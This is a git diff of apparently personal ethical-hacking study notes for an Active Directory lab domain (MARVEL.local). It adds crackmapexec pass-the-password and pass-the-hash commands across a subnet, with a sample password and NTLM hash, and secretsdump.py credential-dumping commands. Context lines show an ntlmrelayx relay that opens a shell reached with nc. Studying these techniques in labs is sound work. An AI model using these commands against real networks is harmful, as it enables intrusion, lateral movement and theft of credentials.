@@ -1,4 +1,4 @@
-<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/8c881cc4-8cef-433b-ba9e-ea445996caab" /># The Five Stages of Ethical Hacking
+# The Five Stages of Ethical Hacking
 
 - [Reconnaissance](#-reconnaissance)
 - [Scanning and Enumeration]
@@ -389,6 +389,7 @@ On windows machine file explorer type \\{kali ip}
 <img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/61a13422-a393-4ff8-8933-70a771ff1335" />
 
 ntlmrelayx.py -tf targets.txt -smbsupport2 -i
+<img width="797" height="521" alt="image" src="https://github.com/user-attachments/assets/8c881cc4-8cef-433b-ba9e-ea445996caab" />
 
 opens a shell. bind it using
 nc {shell ip}
@@ -474,5 +475,25 @@ python3 PlumHound.py --easy -p neo4j1
 python3 PlumHound.py -x tasks/default.tasks -p neo4j1
 creates a report file
 firefox index.html
+
+### crackmapexec
+
+crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1
+<img width="1386" height="315" alt="image" src="https://github.com/user-attachments/assets/f45d8bd0-1ca2-4f10-8dc2-bff50656fb25" />
+
+crackmapexec using hashes
+crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
+
+(shows crackmapexec database)
+cmedb
+
+### secretsdump.py
+secretsdump.py MARVEL.local/fcastle:'Password1'@{ip}
+<img width="1089" height="657" alt="image" src="https://github.com/user-attachments/assets/57cacd4a-d264-42e3-8721-e65d317ec76d" />
+secretsdump.py administrator:@192.168.1.63 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+
+
+
+
 
 
